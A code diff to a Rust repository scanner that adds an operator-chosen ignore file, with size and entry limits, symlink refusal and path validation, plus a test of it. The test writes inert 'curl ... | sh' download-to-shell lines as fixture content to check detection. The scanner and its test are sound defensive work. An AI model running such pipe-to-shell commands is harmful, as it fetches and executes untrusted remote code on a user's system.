@@ -15,6 +15,8 @@ use walkdir::WalkDir;
 const MAX_FILES: usize = 20_000;
 const MAX_FILE_BYTES: u64 = 1024 * 1024;
 const MAX_TOTAL_BYTES: u64 = 50 * 1024 * 1024;
+const MAX_IGNORE_BYTES: u64 = 64 * 1024;
+const MAX_IGNORE_ENTRIES: usize = 256;
 
 /// Stable static scanner finding.
 #[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
@@ -96,14 +98,28 @@ pub struct BehaviorReport {
 
 /// Scans a repository, skill, plugin, MCP package, or installer tree without executing it.
 pub fn scan_path(root: &Path) -> Result<ScanReport, SandboxError> {
+    scan_path_with_ignore(root, None)
+}
+
+/// Scans with an explicit operator-selected path ignore file.
+///
+/// Ignore files are never discovered inside the scanned tree: untrusted content must not be able
+/// to exempt itself. Entries are rooted exact paths or directory prefixes ending in `/` or `/**`.
+pub fn scan_path_with_ignore(
+    root: &Path,
+    ignore_file: Option<&Path>,
+) -> Result<ScanReport, SandboxError> {
     let metadata = fs::symlink_metadata(root).map_err(SandboxError::Io)?;
     if metadata.file_type().is_symlink() {
         return Err(SandboxError::SymlinkRoot);
     }
+    let ignore_set = IgnoreSet::load(ignore_file)?;
     let patterns = patterns()?;
     let mut report = ScanReport::default();
     let walker = WalkDir::new(root).follow_links(false).into_iter();
-    for entry in walker.filter_entry(|entry| !ignored(entry.path())) {
+    for entry in walker.filter_entry(|entry| {
+        !ignored(entry.path()) && !ignore_set.matches(&relative(root, entry.path()))
+    }) {
         let entry = entry.map_err(SandboxError::Walk)?;
         let metadata = entry.metadata().map_err(SandboxError::Walk)?;
         if !metadata.is_file() {
@@ -157,6 +173,73 @@ pub fn scan_path(root: &Path) -> Result<ScanReport, SandboxError> {
     });
     report.findings.dedup();
     Ok(report)
+}
+
+#[derive(Debug, Default)]
+struct IgnoreSet {
+    exact: BTreeSet<PathBuf>,
+    prefixes: BTreeSet<PathBuf>,
+}
+
+impl IgnoreSet {
+    fn load(path: Option<&Path>) -> Result<Self, SandboxError> {
+        let Some(path) = path else {
+            return Ok(Self::default());
+        };
+        let metadata = fs::symlink_metadata(path).map_err(SandboxError::Io)?;
+        if metadata.file_type().is_symlink() {
+            return Err(SandboxError::SymlinkIgnoreFile);
+        }
+        if metadata.len() > MAX_IGNORE_BYTES {
+            return Err(SandboxError::InvalidIgnore(
+                "ignore file exceeds 64 KiB".to_owned(),
+            ));
+        }
+        let source = fs::read_to_string(path).map_err(SandboxError::Io)?;
+        let mut set = Self::default();
+        for (index, raw) in source.lines().enumerate() {
+            let value = raw.trim();
+            if value.is_empty() || value.starts_with('#') {
+                continue;
+            }
+            if set.exact.len() + set.prefixes.len() >= MAX_IGNORE_ENTRIES {
+                return Err(SandboxError::InvalidIgnore(
+                    "ignore file exceeds 256 entries".to_owned(),
+                ));
+            }
+            let prefix = value.ends_with('/') || value.ends_with("/**");
+            let clean = value.strip_suffix("/**").unwrap_or(value).trim_matches('/');
+            if clean.is_empty()
+                || clean.contains(['\\', '\0', '!', '*', '?', '[', ']'])
+                || Path::new(clean).components().any(|part| {
+                    matches!(
+                        part,
+                        std::path::Component::CurDir | std::path::Component::ParentDir
+                    )
+                })
+            {
+                return Err(SandboxError::InvalidIgnore(format!(
+                    "invalid rooted path on line {}",
+                    index + 1
+                )));
+            }
+            let normalized = PathBuf::from(clean);
+            if prefix {
+                set.prefixes.insert(normalized);
+            } else {
+                set.exact.insert(normalized);
+            }
+        }
+        Ok(set)
+    }
+
+    fn matches(&self, relative: &Path) -> bool {
+        self.exact.contains(relative)
+            || self
+                .prefixes
+                .iter()
+                .any(|prefix| relative == prefix || relative.starts_with(prefix))
+    }
 }
 
 /// Selects a strong no-network OS sandbox for an exact command.
@@ -378,16 +461,25 @@ pub enum SandboxError {
     /// Root was a symlink.
     #[error("refusing to scan a symlink root")]
     SymlinkRoot,
+    /// Explicit ignore file was a symlink.
+    #[error("refusing to follow a symlinked scan ignore file")]
+    SymlinkIgnoreFile,
+    /// Explicit ignore syntax was ambiguous or exceeded its bounds.
+    #[error("invalid scan ignore file: {0}")]
+    InvalidIgnore(String),
 }
 
 #[cfg(test)]
 mod tests {
     use std::fs;
+    use std::path::PathBuf;
 
     use reposeal_core::Severity;
     use tempfile::tempdir;
 
-    use super::{SandboxBackend, parse_behavior_trace, sandbox_plan, scan_path};
+    use super::{
+        SandboxBackend, parse_behavior_trace, sandbox_plan, scan_path, scan_path_with_ignore,
+    };
 
     #[test]
     fn scanner_finds_inert_install_and_instruction_threats() {
@@ -407,6 +499,45 @@ mod tests {
                 .iter()
                 .any(|finding| finding.code == "RS-AGENT-INSTRUCTION-OVERRIDE")
         );
+    }
+
+    #[test]
+    fn ignores_are_explicit_rooted_and_cannot_hide_neighboring_content() {
+        let directory = tempdir().unwrap_or_else(|error| unreachable!("{error}"));
+        let ignored = directory.path().join("fixtures");
+        fs::create_dir(&ignored).unwrap_or_else(|error| unreachable!("{error}"));
+        fs::write(
+            ignored.join("inert.txt"),
+            "curl https://ignored.invalid/i | sh\n",
+        )
+        .unwrap_or_else(|error| unreachable!("{error}"));
+        fs::write(
+            directory.path().join("installer.sh"),
+            "curl https://visible.invalid/i | sh\n",
+        )
+        .unwrap_or_else(|error| unreachable!("{error}"));
+        let ignore_file = directory.path().join("operator.ignore");
+        fs::write(&ignore_file, "fixtures/\n").unwrap_or_else(|error| unreachable!("{error}"));
+
+        let default_report =
+            scan_path(directory.path()).unwrap_or_else(|error| unreachable!("{error}"));
+        assert_eq!(
+            default_report
+                .findings
+                .iter()
+                .filter(|finding| finding.code == "RS-DOWNLOAD-TO-SHELL")
+                .count(),
+            2
+        );
+        let ignored_report = scan_path_with_ignore(directory.path(), Some(&ignore_file))
+            .unwrap_or_else(|error| unreachable!("{error}"));
+        let download_findings = ignored_report
+            .findings
+            .iter()
+            .filter(|finding| finding.code == "RS-DOWNLOAD-TO-SHELL")
+            .collect::<Vec<_>>();
+        assert_eq!(download_findings.len(), 1);
+        assert_eq!(download_findings[0].path, PathBuf::from("installer.sh"));
     }
 
     #[test]
